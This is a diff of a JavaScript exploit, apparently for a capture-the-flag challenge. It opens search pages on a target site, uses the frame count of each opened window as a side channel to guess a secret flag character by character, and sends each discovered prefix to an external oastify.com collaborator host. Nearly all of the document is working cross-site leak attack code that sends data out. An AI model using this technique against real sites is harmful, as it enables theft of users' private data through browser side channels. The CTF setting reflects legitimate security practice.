@@ -1,6 +1,6 @@
 <script>
 const BASE = "https://wonder.cbd2026.cloud";
-const EXFIL = "http://njacv1ltv98lg8jybtbpgareu50wosch.oastify.com";
+const EXFIL = "http://2ilrugk8uo70fnida8a4fpqttkzbn8bx.oastify.com";
 
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*().,:;";
 let flag = "CBC{";
@@ -11,33 +11,32 @@ function leak(s) {
 
 async function test(prefix) {
   let w = open(BASE + "/search?q=" + encodeURIComponent(prefix), "_blank");
-  await new Promise(r => setTimeout(r, 2500));
+  await new Promise(r => setTimeout(r, 900));
 
   let ok = false;
-  try {
-    ok = w.length > 0;
-  } catch(e) {}
-
+  try { ok = w.length > 0; } catch(e) {}
   try { w.close(); } catch(e) {}
+
   return ok;
 }
 
 async function run() {
-  leak("START");
+  leak("START:" + flag);
 
   while (true) {
     let found = false;
 
     for (let c of charset) {
-      let guess = flag + c;
-      leak("TRY:" + guess);
-
-      if (await test(guess)) {
+      if (await test(flag + c)) {
         flag += c;
         leak(flag);
         found = true;
 
-        if (c === "}") return;
+        if (c === "}") {
+          leak("DONE:" + flag);
+          return;
+        }
+
         break;
       }
     }
